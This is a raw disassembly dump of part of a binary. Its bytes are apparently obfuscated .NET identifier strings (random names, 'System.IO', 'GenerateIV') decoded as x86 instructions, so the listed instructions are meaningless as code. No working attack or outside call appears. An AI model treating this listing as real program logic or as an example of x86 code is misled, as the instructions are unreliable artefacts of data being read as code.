  407a8a:	71 55                	jno    0x407ae1
  407a8c:	65 4d                	gs dec %ebp
  407a8e:	00 53 46             	add    %dl,0x46(%ebx)
  407a91:	6b 43 7a 59          	imul   $0x59,0x7a(%ebx),%eax
  407a95:	64 50                	fs push %eax
  407a97:	6d                   	insl   (%dx),%es:(%edi)
  407a98:	4d                   	dec    %ebp
  407a99:	00 59 70             	add    %bl,0x70(%ecx)
  407a9c:	71 61                	jno    0x407aff
  407a9e:	6c                   	insb   (%dx),%es:(%edi)
  407a9f:	4b                   	dec    %ebx
  407aa0:	46                   	inc    %esi
  407aa1:	42                   	inc    %edx
  407aa2:	4c                   	dec    %esp
  407aa3:	72 4a                	jb     0x407aef
  407aa5:	6f                   	outsl  %ds:(%esi),(%dx)
  407aa6:	4d                   	dec    %ebp
  407aa7:	00 48 6f             	add    %cl,0x6f(%eax)
  407aaa:	70 61                	jo     0x407b0d
  407aac:	49                   	dec    %ecx
  407aad:	76 6f                	jbe    0x407b1e
  407aaf:	4c                   	dec    %esp
  407ab0:	56                   	push   %esi
  407ab1:	4c                   	dec    %esp
  407ab2:	54                   	push   %esp
  407ab3:	48                   	dec    %eax
  407ab4:	7a 76                	jp     0x407b2c
  407ab6:	4d                   	dec    %ebp
  407ab7:	00 54 61 44          	add    %dl,0x44(%ecx,%eiz,2)
  407abb:	72 78                	jb     0x407b35
  407abd:	45                   	inc    %ebp
  407abe:	6f                   	outsl  %ds:(%esi),(%dx)
  407abf:	75 55                	jne    0x407b16
  407ac1:	67 62 53 4e          	bound  %edx,0x4e(%bp,%di)
  407ac5:	00 4b 4d             	add    %cl,0x4d(%ebx)
  407ac8:	6c                   	insb   (%dx),%es:(%edi)
  407ac9:	52                   	push   %edx
  407aca:	62 76 69             	bound  %esi,0x69(%esi)
  407acd:	73 70                	jae    0x407b3f
  407acf:	43                   	inc    %ebx
  407ad0:	62 4e 00             	bound  %ecx,0x0(%esi)
  407ad3:	53                   	push   %ebx
  407ad4:	43                   	inc    %ebx
  407ad5:	44                   	inc    %esp
  407ad6:	53                   	push   %ebx
  407ad7:	75 44                	jne    0x407b1d
  407ad9:	4f                   	dec    %edi
  407ada:	52                   	push   %edx
  407adb:	52                   	push   %edx
  407adc:	72 4e                	jb     0x407b2c
  407ade:	00 66 42             	add    %ah,0x42(%esi)
  407ae1:	57                   	push   %edi
  407ae2:	62 56 51             	bound  %edx,0x51(%esi)
  407ae5:	67 51                	addr16 push %ecx
  407ae7:	64 77 43             	fs ja  0x407b2d
  407aea:	4b                   	dec    %ebx
  407aeb:	79 4e                	jns    0x407b3b
  407aed:	00 71 63             	add    %dh,0x63(%ecx)
  407af0:	76 77                	jbe    0x407b69
  407af2:	4b                   	dec    %ebx
  407af3:	75 73                	jne    0x407b68
  407af5:	4c                   	dec    %esp
  407af6:	77 63                	ja     0x407b5b
  407af8:	63 44 4f 00          	arpl   %eax,0x0(%edi,%ecx,2)
  407afc:	53                   	push   %ebx
  407afd:	79 73                	jns    0x407b72
  407aff:	74 65                	je     0x407b66
  407b01:	6d                   	insl   (%dx),%es:(%edi)
  407b02:	2e 49                	cs dec %ecx
  407b04:	4f                   	dec    %edi
  407b05:	00 77 72             	add    %dh,0x72(%edi)
  407b08:	62 65 6a             	bound  %esp,0x6a(%ebp)
  407b0b:	66 6e                	data16 outsb %ds:(%esi),(%dx)
  407b0d:	64 46                	fs inc %esi
  407b0f:	4c                   	dec    %esp
  407b10:	4f                   	dec    %edi
  407b11:	00 74 66 50          	add    %dh,0x50(%esi,%eiz,2)
  407b15:	76 55                	jbe    0x407b6c
  407b17:	47                   	inc    %edi
  407b18:	42                   	inc    %edx
  407b19:	66 46                	inc    %si
  407b1b:	4e                   	dec    %esi
  407b1c:	76 5a                	jbe    0x407b78
  407b1e:	4f                   	dec    %edi
  407b1f:	00 71 4c             	add    %dh,0x4c(%ecx)
  407b22:	6a 79                	push   $0x79
  407b24:	6b 66 6c 57          	imul   $0x57,0x6c(%esi),%esp
  407b28:	4e                   	dec    %esi
  407b29:	69 4c 67 4f 00 50 6f 	imul   $0x616f5000,0x4f(%edi,%eiz,2),%ecx
  407b30:	61 
  407b31:	63 47 41             	arpl   %eax,0x41(%edi)
  407b34:	74 53                	je     0x407b89
  407b36:	54                   	push   %esp
  407b37:	70 58                	jo     0x407b91
  407b39:	59                   	pop    %ecx
  407b3a:	74 4e                	je     0x407b8a
  407b3c:	48                   	dec    %eax
  407b3d:	50                   	push   %eax
  407b3e:	00 6f 58             	add    %ch,0x58(%edi)
  407b41:	44                   	inc    %esp
  407b42:	54                   	push   %esp
  407b43:	58                   	pop    %eax
  407b44:	45                   	inc    %ebp
  407b45:	72 62                	jb     0x407ba9
  407b47:	67 57                	addr16 push %edi
  407b49:	49                   	dec    %ecx
  407b4a:	50                   	push   %eax
  407b4b:	00 53 65             	add    %dl,0x65(%ebx)
  407b4e:	5a                   	pop    %edx
  407b4f:	4e                   	dec    %esi
  407b50:	44                   	inc    %esp
  407b51:	49                   	dec    %ecx
  407b52:	7a 51                	jp     0x407ba5
  407b54:	6c                   	insb   (%dx),%es:(%edi)
  407b55:	42                   	inc    %edx
  407b56:	75 4a                	jne    0x407ba2
  407b58:	50                   	push   %eax
  407b59:	00 68 72             	add    %ch,0x72(%eax)
  407b5c:	5a                   	pop    %edx
  407b5d:	48                   	dec    %eax
  407b5e:	4a                   	dec    %edx
  407b5f:	77 77                	ja     0x407bd8
  407b61:	55                   	push   %ebp
  407b62:	69 48 48 4f 50 00 55 	imul   $0x5500504f,0x48(%eax),%ecx
  407b69:	4d                   	dec    %ebp
  407b6a:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  407b6d:	64 79 50             	fs jns 0x407bc0
  407b70:	51                   	push   %ecx
  407b71:	4e                   	dec    %esi
  407b72:	43                   	inc    %ebx
  407b73:	61                   	popa
  407b74:	50                   	push   %eax
  407b75:	00 61 51             	add    %ah,0x51(%ecx)
  407b78:	65 43                	gs inc %ebx
  407b7a:	6b 77 44 55          	imul   $0x55,0x44(%edi),%esi
  407b7e:	6e                   	outsb  %ds:(%esi),(%dx)
  407b7f:	55                   	push   %ebp
  407b80:	54                   	push   %esp
  407b81:	74 50                	je     0x407bd3
  407b83:	00 67 65             	add    %ah,0x65(%edi)
  407b86:	55                   	push   %ebp
  407b87:	47                   	inc    %edi
  407b88:	69 71 4d 55 4f 78 70 	imul   $0x70784f55,0x4d(%ecx),%esi
  407b8f:	41                   	inc    %ecx
  407b90:	59                   	pop    %ecx
  407b91:	51                   	push   %ecx
  407b92:	00 6a 68             	add    %ch,0x68(%edx)
  407b95:	58                   	pop    %eax
  407b96:	61                   	popa
  407b97:	7a 68                	jp     0x407c01
  407b99:	74 50                	je     0x407beb
  407b9b:	58                   	pop    %eax
  407b9c:	59                   	pop    %ecx
  407b9d:	62 6d 51             	bound  %ebp,0x51(%ebp)
  407ba0:	00 71 5a             	add    %dh,0x5a(%ecx)
  407ba3:	66 72 66             	data16 jb 0x407c0c
  407ba6:	78 64                	js     0x407c0c
  407ba8:	43                   	inc    %ebx
  407ba9:	43                   	inc    %ebx
  407baa:	72 76                	jb     0x407c22
  407bac:	6f                   	outsl  %ds:(%esi),(%dx)
  407bad:	51                   	push   %ecx
  407bae:	00 74 74 4a          	add    %dh,0x4a(%esp,%esi,2)
  407bb2:	42                   	inc    %edx
  407bb3:	6d                   	insl   (%dx),%es:(%edi)
  407bb4:	75 58                	jne    0x407c0e
  407bb6:	76 70                	jbe    0x407c28
  407bb8:	4b                   	dec    %ebx
  407bb9:	75 51                	jne    0x407c0c
  407bbb:	00 41 51             	add    %al,0x51(%ecx)
  407bbe:	72 48                	jb     0x407c08
  407bc0:	65 49                	gs dec %ecx
  407bc2:	4e                   	dec    %esi
  407bc3:	6d                   	insl   (%dx),%es:(%edi)
  407bc4:	41                   	inc    %ecx
  407bc5:	52                   	push   %edx
  407bc6:	00 65 63             	add    %ah,0x63(%ebp)
  407bc9:	4d                   	dec    %ebp
  407bca:	6a 45                	push   $0x45
  407bcc:	72 70                	jb     0x407c3e
  407bce:	6e                   	outsb  %ds:(%esi),(%dx)
  407bcf:	61                   	popa
  407bd0:	53                   	push   %ebx
  407bd1:	4d                   	dec    %ebp
  407bd2:	42                   	inc    %edx
  407bd3:	52                   	push   %edx
  407bd4:	00 77 43             	add    %dh,0x43(%edi)
  407bd7:	5a                   	pop    %edx
  407bd8:	74 61                	je     0x407c3b
  407bda:	75 68                	jne    0x407c44
  407bdc:	51                   	push   %ecx
  407bdd:	6a 75                	push   $0x75
  407bdf:	55                   	push   %ebp
  407be0:	52                   	push   %edx
  407be1:	00 72 55             	add    %dh,0x55(%edx)
  407be4:	64 4e                	fs dec %esi
  407be6:	50                   	push   %eax
  407be7:	75 65                	jne    0x407c4e
  407be9:	48                   	dec    %eax
  407bea:	63 56 52             	arpl   %edx,0x52(%esi)
  407bed:	00 42 6a             	add    %al,0x6a(%edx)
  407bf0:	6d                   	insl   (%dx),%es:(%edi)
  407bf1:	70 75                	jo     0x407c68
  407bf3:	62 43 51             	bound  %eax,0x51(%ebx)
  407bf6:	74 49                	je     0x407c41
  407bf8:	55                   	push   %ebp
  407bf9:	64 52                	fs push %edx
  407bfb:	00 6b 56             	add    %ch,0x56(%ebx)
  407bfe:	6d                   	insl   (%dx),%es:(%edi)
  407bff:	45                   	inc    %ebp
  407c00:	57                   	push   %edi
  407c01:	49                   	dec    %ecx
  407c02:	75 46                	jne    0x407c4a
  407c04:	47                   	inc    %edi
  407c05:	62 44 46 67          	bound  %eax,0x67(%esi,%eax,2)
  407c09:	52                   	push   %edx
  407c0a:	00 62 6d             	add    %ah,0x6d(%edx)
  407c0d:	70 71                	jo     0x407c80
  407c0f:	69 78 4a 6f 45 4f 46 	imul   $0x464f456f,0x4a(%eax),%edi
  407c16:	53                   	push   %ebx
  407c17:	00 42 49             	add    %al,0x49(%edx)
  407c1a:	68 6d 4f 43 66       	push   $0x66434f6d
  407c1f:	58                   	pop    %eax
  407c20:	56                   	push   %esi
  407c21:	74 70                	je     0x407c93
  407c23:	76 54                	jbe    0x407c79
  407c25:	4b                   	dec    %ebx
  407c26:	53                   	push   %ebx
  407c27:	00 79 73             	add    %bh,0x73(%ecx)
  407c2a:	45                   	inc    %ebp
  407c2b:	5a                   	pop    %edx
  407c2c:	6d                   	insl   (%dx),%es:(%edi)
  407c2d:	43                   	inc    %ebx
  407c2e:	47                   	inc    %edi
  407c2f:	47                   	inc    %edi
  407c30:	76 53                	jbe    0x407c85
  407c32:	53                   	push   %ebx
  407c33:	00 6a 50             	add    %ch,0x50(%edx)
  407c36:	46                   	inc    %esi
  407c37:	54                   	push   %esp
  407c38:	75 46                	jne    0x407c80
  407c3a:	43                   	inc    %ebx
  407c3b:	78 72                	js     0x407caf
  407c3d:	74 58                	je     0x407c97
  407c3f:	53                   	push   %ebx
  407c40:	00 57 45             	add    %dl,0x45(%edi)
  407c43:	43                   	inc    %ebx
  407c44:	67 50                	addr16 push %eax
  407c46:	51                   	push   %ecx
  407c47:	59                   	pop    %ecx
  407c48:	70 59                	jo     0x407ca3
  407c4a:	53                   	push   %ebx
  407c4b:	00 4e 7a             	add    %cl,0x7a(%esi)
  407c4e:	47                   	inc    %edi
  407c4f:	58                   	pop    %eax
  407c50:	59                   	pop    %ecx
  407c51:	6f                   	outsl  %ds:(%esi),(%dx)
  407c52:	4f                   	dec    %edi
  407c53:	78 54                	js     0x407ca9
  407c55:	64 53                	fs push %ebx
  407c57:	00 50 75             	add    %dl,0x75(%eax)
  407c5a:	53                   	push   %ebx
  407c5b:	42                   	inc    %edx
  407c5c:	70 4e                	jo     0x407cac
  407c5e:	79 58                	jns    0x407cb8
  407c60:	5a                   	pop    %edx
  407c61:	49                   	dec    %ecx
  407c62:	76 74                	jbe    0x407cd8
  407c64:	6d                   	insl   (%dx),%es:(%edi)
  407c65:	53                   	push   %ebx
  407c66:	00 44 5a 42          	add    %al,0x42(%edx,%ebx,2)
  407c6a:	55                   	push   %ebp
  407c6b:	5a                   	pop    %edx
  407c6c:	74 6e                	je     0x407cdc
  407c6e:	75 42                	jne    0x407cb2
  407c70:	48                   	dec    %eax
  407c71:	64 56                	fs push %esi
  407c73:	76 77                	jbe    0x407cec
  407c75:	53                   	push   %ebx
  407c76:	00 44 6e 75          	add    %al,0x75(%esi,%ebp,2)
  407c7a:	6e                   	outsb  %ds:(%esi),(%dx)
  407c7b:	43                   	inc    %ebx
  407c7c:	59                   	pop    %ecx
  407c7d:	53                   	push   %ebx
  407c7e:	4b                   	dec    %ebx
  407c7f:	69 67 43 54 00 4a 4c 	imul   $0x4c4a0054,0x43(%edi),%esp
  407c86:	6f                   	outsl  %ds:(%esi),(%dx)
  407c87:	75 77                	jne    0x407d00
  407c89:	4d                   	dec    %ebp
  407c8a:	6c                   	insb   (%dx),%es:(%edi)
  407c8b:	68 7a 42 4e 54       	push   $0x544e427a
  407c90:	00 6b 6d             	add    %ch,0x6d(%ebx)
  407c93:	6f                   	outsl  %ds:(%esi),(%dx)
  407c94:	51                   	push   %ecx
  407c95:	4e                   	dec    %esi
  407c96:	61                   	popa
  407c97:	64 4b                	fs dec %ebx
  407c99:	75 6a                	jne    0x407d05
  407c9b:	51                   	push   %ecx
  407c9c:	61                   	popa
  407c9d:	54                   	push   %esp
  407c9e:	00 41 48             	add    %al,0x48(%ecx)
  407ca1:	4d                   	dec    %ebp
  407ca2:	68 42 64 41 63       	push   $0x63416442
  407ca7:	76 6a                	jbe    0x407d13
  407ca9:	54                   	push   %esp
  407caa:	00 56 64             	add    %dl,0x64(%esi)
  407cad:	62 77 78             	bound  %esi,0x78(%edi)
  407cb0:	46                   	inc    %esi
  407cb1:	69 76 7a 53 4d 47 55 	imul   $0x55474d53,0x7a(%esi),%esi
  407cb8:	00 55 55             	add    %dl,0x55(%ebp)
  407cbb:	64 53                	fs push %ebx
  407cbd:	64 43                	fs inc %ebx
  407cbf:	58                   	pop    %eax
  407cc0:	6f                   	outsl  %ds:(%esi),(%dx)
  407cc1:	4b                   	dec    %ebx
  407cc2:	55                   	push   %ebp
  407cc3:	00 54 6a 54          	add    %dl,0x54(%edx,%ebp,2)
  407cc7:	58                   	pop    %eax
  407cc8:	70 79                	jo     0x407d43
  407cca:	66 48                	dec    %ax
  407ccc:	44                   	inc    %esp
  407ccd:	4f                   	dec    %edi
  407cce:	55                   	push   %ebp
  407ccf:	00 74 6b 78          	add    %dh,0x78(%ebx,%ebp,2)
  407cd3:	50                   	push   %eax
  407cd4:	42                   	inc    %edx
  407cd5:	73 48                	jae    0x407d1f
  407cd7:	59                   	pop    %ecx
  407cd8:	4a                   	dec    %edx
  407cd9:	71 73                	jno    0x407d4e
  407cdb:	6a 66                	push   $0x66
  407cdd:	55                   	push   %ebp
  407cde:	00 66 51             	add    %ah,0x51(%esi)
  407ce1:	52                   	push   %edx
  407ce2:	48                   	dec    %eax
  407ce3:	6b 78 6d 49          	imul   $0x49,0x6d(%eax),%edi
  407ce7:	7a 66                	jp     0x407d4f
  407ce9:	56                   	push   %esi
  407cea:	64 76 55             	fs jbe 0x407d42
  407ced:	00 6d 49             	add    %ch,0x49(%ebp)
  407cf0:	6d                   	insl   (%dx),%es:(%edi)
  407cf1:	69 4b 67 76 49 77 4a 	imul   $0x4a774976,0x67(%ebx),%ecx
  407cf8:	72 41                	jb     0x407d3b
  407cfa:	56                   	push   %esi
  407cfb:	00 77 57             	add    %dh,0x57(%edi)
  407cfe:	4e                   	dec    %esi
  407cff:	45                   	inc    %ebp
  407d00:	6f                   	outsl  %ds:(%esi),(%dx)
  407d01:	76 63                	jbe    0x407d66
  407d03:	71 75                	jno    0x407d7a
  407d05:	41                   	inc    %ecx
  407d06:	56                   	push   %esi
  407d07:	00 66 4d             	add    %ah,0x4d(%esi)
  407d0a:	4a                   	dec    %edx
  407d0b:	5a                   	pop    %edx
  407d0c:	59                   	pop    %ecx
  407d0d:	46                   	inc    %esi
  407d0e:	67 7a 74             	addr16 jp 0x407d85
  407d11:	6c                   	insb   (%dx),%es:(%edi)
  407d12:	67 58                	addr16 pop %eax
  407d14:	69 5a 44 56 00 4e 51 	imul   $0x514e0056,0x44(%edx),%ebx
  407d1b:	57                   	push   %edi
  407d1c:	51                   	push   %ecx
  407d1d:	6e                   	outsb  %ds:(%esi),(%dx)
  407d1e:	72 52                	jb     0x407d72
  407d20:	76 6a                	jbe    0x407d8c
  407d22:	45                   	inc    %ebp
  407d23:	56                   	push   %esi
  407d24:	00 56 65             	add    %dl,0x65(%esi)
  407d27:	72 62                	jb     0x407d8b
  407d29:	57                   	push   %edi
  407d2a:	59                   	pop    %ecx
  407d2b:	50                   	push   %eax
  407d2c:	6f                   	outsl  %ds:(%esi),(%dx)
  407d2d:	76 45                	jbe    0x407d74
  407d2f:	56                   	push   %esi
  407d30:	00 79 6c             	add    %bh,0x6c(%ecx)
  407d33:	46                   	inc    %esi
  407d34:	50                   	push   %eax
  407d35:	42                   	inc    %edx
  407d36:	75 4a                	jne    0x407d82
  407d38:	76 69                	jbe    0x407da3
  407d3a:	68 46 56 00 67       	push   $0x67005646
  407d3f:	65 74 5f             	gs je  0x407da1
  407d42:	49                   	dec    %ecx
  407d43:	56                   	push   %esi
  407d44:	00 73 65             	add    %dh,0x65(%ebx)
  407d47:	74 5f                	je     0x407da8
  407d49:	49                   	dec    %ecx
  407d4a:	56                   	push   %esi
  407d4b:	00 47 65             	add    %al,0x65(%edi)
  407d4e:	6e                   	outsb  %ds:(%esi),(%dx)
  407d4f:	65 72 61             	gs jb  0x407db3
  407d52:	74 65                	je     0x407db9
  407d54:	49                   	dec    %ecx
  407d55:	56                   	push   %esi
  407d56:	00 45 70             	add    %al,0x70(%ebp)
  407d59:	64 4c                	fs dec %esp
  407d5b:	6f                   	outsl  %ds:(%esi),(%dx)
  407d5c:	49                   	dec    %ecx
  407d5d:	73 48                	jae    0x407da7
  407d5f:	4b                   	dec    %ebx
  407d60:	5a                   	pop    %edx
  407d61:	78 6c                	js     0x407dcf
  407d63:	56                   	push   %esi
  407d64:	56                   	push   %esi
  407d65:	00 4f 7a             	add    %cl,0x7a(%edi)
  407d68:	55                   	push   %ebp
  407d69:	59                   	pop    %ecx
  407d6a:	49                   	dec    %ecx
  407d6b:	4a                   	dec    %edx
  407d6c:	48                   	dec    %eax
  407d6d:	5a                   	pop    %edx
  407d6e:	55                   	push   %ebp
  407d6f:	4f                   	dec    %edi
  407d70:	45                   	inc    %ebp
  407d71:	65 6a 5a             	gs push $0x5a
  407d74:	56                   	push   %esi
  407d75:	00 76 53             	add    %dh,0x53(%esi)
  407d78:	70 49                	jo     0x407dc3
  407d7a:	61                   	popa
  407d7b:	54                   	push   %esp
  407d7c:	61                   	popa
  407d7d:	48                   	dec    %eax
  407d7e:	4d                   	dec    %ebp
  407d7f:	4e                   	dec    %esi
  407d80:	53                   	push   %ebx
  407d81:	58                   	pop    %eax
  407d82:	61                   	popa
  407d83:	56                   	push   %esi
  407d84:	00 47 55             	add    %al,0x55(%edi)
  407d87:	6f                   	outsl  %ds:(%esi),(%dx)
  407d88:	43                   	inc    %ebx
  407d89:	65 6e                	outsb  %gs:(%esi),(%dx)
  407d8b:	4d                   	dec    %ebp
  407d8c:	57                   	push   %edi
  407d8d:	4d                   	dec    %ebp
  407d8e:	4e                   	dec    %esi
  407d8f:	64 46                	fs inc %esi
  407d91:	64 56                	fs push %esi
  407d93:	00 53 5a             	add    %dl,0x5a(%ebx)
  407d96:	6e                   	outsb  %ds:(%esi),(%dx)
  407d97:	50                   	push   %eax
  407d98:	6e                   	outsb  %ds:(%esi),(%dx)
  407d99:	52                   	push   %edx
  407d9a:	4b                   	dec    %ebx
  407d9b:	77 41                	ja     0x407dde
  407d9d:	49                   	dec    %ecx
  407d9e:	66 6b 56 00 4b       	imul   $0x4b,0x0(%esi),%dx
  407da3:	69 45 46 6d 67 71 71 	imul   $0x7171676d,0x46(%ebp),%eax
  407daa:	75 56                	jne    0x407e02
  407dac:	00 47 44             	add    %al,0x44(%edi)
  407daf:	62 6f 7a             	bound  %ebp,0x7a(%edi)
  407db2:	44                   	inc    %esp
  407db3:	67 77 5a             	addr16 ja 0x407e10
  407db6:	61                   	popa
  407db7:	68 51 77 56 00       	push   $0x567751
  407dbc:	54                   	push   %esp
  407dbd:	68 63 57 6b 65       	push   $0x656b5763
  407dc2:	66 43                	inc    %bx
  407dc4:	6e                   	outsb  %ds:(%esi),(%dx)
  407dc5:	52                   	push   %edx
  407dc6:	57                   	push   %edi
  407dc7:	00 6f 6f             	add    %ch,0x6f(%edi)
  407dca:	59                   	pop    %ecx
  407dcb:	71 57                	jno    0x407e24
  407dcd:	47                   	inc    %edi
  407dce:	4d                   	dec    %ebp
  407dcf:	65 4b                	gs dec %ebx
  407dd1:	66 58                	pop    %ax
  407dd3:	5a                   	pop    %edx
  407dd4:	6b 57 00 4c          	imul   $0x4c,0x0(%edi),%edx
  407dd8:	6e                   	outsb  %ds:(%esi),(%dx)
  407dd9:	6c                   	insb   (%dx),%es:(%edi)
  407dda:	74 5a                	je     0x407e36
  407ddc:	78 6c                	js     0x407e4a
  407dde:	67 56                	addr16 push %esi
  407de0:	6e                   	outsb  %ds:(%esi),(%dx)
  407de1:	57                   	push   %edi
  407de2:	00 58 56             	add    %bl,0x56(%eax)
  407de5:	62 62 7a             	bound  %esp,0x7a(%edx)
  407de8:	68 69 55 6d 65       	push   $0x656d5569
  407ded:	79 57                	jns    0x407e46
  407def:	71 57                	jno    0x407e48
  407df1:	00 44 5a 64          	add    %al,0x64(%edx,%ebx,2)
  407df5:	6e                   	outsb  %ds:(%esi),(%dx)
  407df6:	57                   	push   %edi
  407df7:	68 42 41 78 57       	push   $0x57784142
  407dfc:	00 4c 71 67          	add    %cl,0x67(%ecx,%esi,2)
  407e00:	51                   	push   %ecx
  407e01:	50                   	push   %eax
  407e02:	71 75                	jno    0x407e79
  407e04:	66 7a 57             	data16 jp 0x407e5e
  407e07:	00 50 6a             	add    %dl,0x6a(%eax)
  407e0a:	4c                   	dec    %esp
  407e0b:	6f                   	outsl  %ds:(%esi),(%dx)
  407e0c:	42                   	inc    %edx
  407e0d:	4c                   	dec    %esp
  407e0e:	67 50                	addr16 push %eax
  407e10:	41                   	inc    %ecx
  407e11:	4f                   	dec    %edi
  407e12:	55                   	push   %ebp
  407e13:	47                   	inc    %edi
  407e14:	58                   	pop    %eax
  407e15:	00 4a 64             	add    %cl,0x64(%edx)
  407e18:	46                   	inc    %esi
  407e19:	6d                   	insl   (%dx),%es:(%edi)
  407e1a:	79 66                	jns    0x407e82
  407e1c:	42                   	inc    %edx
  407e1d:	50                   	push   %eax
  407e1e:	43                   	inc    %ebx
  407e1f:	43                   	inc    %ebx
  407e20:	50                   	push   %eax
  407e21:	4f                   	dec    %edi
  407e22:	58                   	pop    %eax
  407e23:	00 54 6b 51          	add    %dl,0x51(%ebx,%ebp,2)
  407e27:	48                   	dec    %eax
  407e28:	70 4c                	jo     0x407e76
  407e2a:	4f                   	dec    %edi
  407e2b:	56                   	push   %esi
  407e2c:	74 6d                	je     0x407e9b
  407e2e:	49                   	dec    %ecx
  407e2f:	50                   	push   %eax
  407e30:	58                   	pop    %eax
  407e31:	00 47 43             	add    %al,0x43(%edi)
  407e34:	44                   	inc    %esp
  407e35:	52                   	push   %edx
  407e36:	57                   	push   %edi
  407e37:	49                   	dec    %ecx
  407e38:	68 71 42 65 56       	push   $0x56654271
  407e3d:	51                   	push   %ecx
  407e3e:	58                   	pop    %eax
  407e3f:	00 6d 61             	add    %ch,0x61(%ebp)
  407e42:	70 56                	jo     0x407e9a
  407e44:	41                   	inc    %ecx
  407e45:	44                   	inc    %esp
  407e46:	70 4c                	jo     0x407e94
  407e48:	66 52                	push   %dx
  407e4a:	58                   	pop    %eax
  407e4b:	00 70 4b             	add    %dh,0x4b(%eax)
  407e4e:	44                   	inc    %esp
  407e4f:	74 4c                	je     0x407e9d
  407e51:	6a 4c                	push   $0x4c
  407e53:	56                   	push   %esi
  407e54:	5a                   	pop    %edx
  407e55:	50                   	push   %eax
  407e56:	47                   	inc    %edi
  407e57:	74 58                	je     0x407eb1
  407e59:	58                   	pop    %eax
  407e5a:	00 77 65             	add    %dh,0x65(%edi)
  407e5d:	47                   	inc    %edi
  407e5e:	77 41                	ja     0x407ea1
  407e60:	72 41                	jb     0x407ea3
  407e62:	4c                   	dec    %esp
  407e63:	68 58 00 45 50       	push   $0x50450058
  407e68:	62 51 4b             	bound  %edx,0x4b(%ecx)
  407e6b:	53                   	push   %ebx
  407e6c:	57                   	push   %edi
  407e6d:	42                   	inc    %edx
  407e6e:	6a 54                	push   $0x54
  407e70:	6e                   	outsb  %ds:(%esi),(%dx)
  407e71:	58                   	pop    %eax
  407e72:	00 6c 76 54          	add    %ch,0x54(%esi,%esi,2)
  407e76:	6f                   	outsl  %ds:(%esi),(%dx)
  407e77:	6b 74 6f 58 6a       	imul   $0x6a,0x58(%edi,%ebp,2),%esi
  407e7c:	71 71                	jno    0x407eef
  407e7e:	58                   	pop    %eax
  407e7f:	00 66 74             	add    %ah,0x74(%esi)
  407e82:	6d                   	insl   (%dx),%es:(%edi)
  407e83:	68 65 5a 4d 58       	push   $0x584d5a65
  407e88:	7a 54                	jp     0x407ede
  407e8a:	4a                   	dec    %edx
  407e8b:	74 58                	je     0x407ee5
  407e8d:	00 76 63             	add    %dh,0x63(%esi)
  407e90:	66 5a                	pop    %dx
  407e92:	6d                   	insl   (%dx),%es:(%edi)
  407e93:	6e                   	outsb  %ds:(%esi),(%dx)
  407e94:	56                   	push   %esi
  407e95:	76 66                	jbe    0x407efd
  407e97:	4b                   	dec    %ebx
  407e98:	42                   	inc    %edx
  407e99:	59                   	pop    %ecx
  407e9a:	00 53 6c             	add    %dl,0x6c(%ebx)
  407e9d:	6c                   	insb   (%dx),%es:(%edi)
  407e9e:	61                   	popa
  407e9f:	50                   	push   %eax
  407ea0:	49                   	dec    %ecx
  407ea1:	50                   	push   %eax
  407ea2:	50                   	push   %eax
  407ea3:	49                   	dec    %ecx
  407ea4:	4f                   	dec    %edi
  407ea5:	6b 4e 59 00          	imul   $0x0,0x59(%esi),%ecx
  407ea9:	77 43                	ja     0x407eee
  407eab:	43                   	inc    %ebx
  407eac:	50                   	push   %eax
  407ead:	77 77                	ja     0x407f26
  407eaf:	59                   	pop    %ecx
  407eb0:	7a 77                	jp     0x407f29
  407eb2:	70 6f                	jo     0x407f23
  407eb4:	54                   	push   %esp
  407eb5:	59                   	pop    %ecx
  407eb6:	00 58 54             	add    %bl,0x54(%eax)
  407eb9:	68 65 75 51 44       	push   $0x44517565
  407ebe:	55                   	push   %ebp
  407ebf:	75 62                	jne    0x407f23
  407ec1:	74 69                	je     0x407f2c
  407ec3:	59                   	pop    %ecx
  407ec4:	00 41 48             	add    %al,0x48(%ecx)
  407ec7:	79 4a                	jns    0x407f13
  407ec9:	47                   	inc    %edi
  407eca:	4d                   	dec    %ebp
  407ecb:	76 68                	jbe    0x407f35
  407ecd:	64 54                	fs push %esp
  407ecf:	45                   	inc    %ebp
  407ed0:	5a                   	pop    %edx
  407ed1:	64 51                	fs push %ecx
  407ed3:	48                   	dec    %eax
  407ed4:	6b 59 00 4f          	imul   $0x4f,0x0(%ecx),%ebx
  407ed8:	6c                   	insb   (%dx),%es:(%edi)
  407ed9:	57                   	push   %edi
  407eda:	61                   	popa
  407edb:	75 47                	jne    0x407f24
  407edd:	42                   	inc    %edx
  407ede:	66 54                	push   %sp
  407ee0:	64 50                	fs push %eax
  407ee2:	72 6d                	jb     0x407f51
  407ee4:	59                   	pop    %ecx
  407ee5:	00 66 57             	add    %ah,0x57(%esi)
  407ee8:	67 4a                	addr16 dec %edx
  407eea:	46                   	inc    %esi
  407eeb:	44                   	inc    %esp
  407eec:	78 49                	js     0x407f37
  407eee:	41                   	inc    %ecx
  407eef:	48                   	dec    %eax
  407ef0:	61                   	popa
  407ef1:	47                   	inc    %edi
  407ef2:	5a                   	pop    %edx
  407ef3:	00 78 46             	add    %bh,0x46(%eax)
  407ef6:	71 65                	jno    0x407f5d
  407ef8:	63 72 6b             	arpl   %esi,0x6b(%edx)
  407efb:	4f                   	dec    %edi
  407efc:	63 63 62             	arpl   %esp,0x62(%ebx)
  407eff:	49                   	dec    %ecx
  407f00:	5a                   	pop    %edx
  407f01:	00 59 59             	add    %bl,0x59(%ecx)
  407f04:	63 76 46             	arpl   %esi,0x46(%esi)
  407f07:	4a                   	dec    %edx
  407f08:	74 66                	je     0x407f70
  407f0a:	70 62                	jo     0x407f6e
  407f0c:	4d                   	dec    %ebp
  407f0d:	5a                   	pop    %edx
  407f0e:	00 6e 66             	add    %ch,0x66(%esi)
  407f11:	51                   	push   %ecx
  407f12:	49                   	dec    %ecx
  407f13:	64 42                	fs inc %edx
  407f15:	55                   	push   %ebp
  407f16:	75 6b                	jne    0x407f83
  407f18:	73 5a                	jae    0x407f74
  407f1a:	00 76 61             	add    %dh,0x61(%esi)
  407f1d:	6c                   	insb   (%dx),%es:(%edi)
  407f1e:	75 65                	jne    0x407f85
  407f20:	5f                   	pop    %edi
  407f21:	5f                   	pop    %edi
  407f22:	00 51 45             	add    %dl,0x45(%ecx)
  407f25:	55                   	push   %ebp
  407f26:	4a                   	dec    %edx
  407f27:	46                   	inc    %esi
  407f28:	57                   	push   %edi
  407f29:	65 68 76 79 72 46    	gs push $0x46727976
  407f2f:	44                   	inc    %esp
  407f30:	61                   	popa
  407f31:	00 66 4c             	add    %ah,0x4c(%esi)
  407f34:	61                   	popa
  407f35:	43                   	inc    %ebx
  407f36:	73 6b                	jae    0x407fa3
  407f38:	72 6a                	jb     0x407fa4
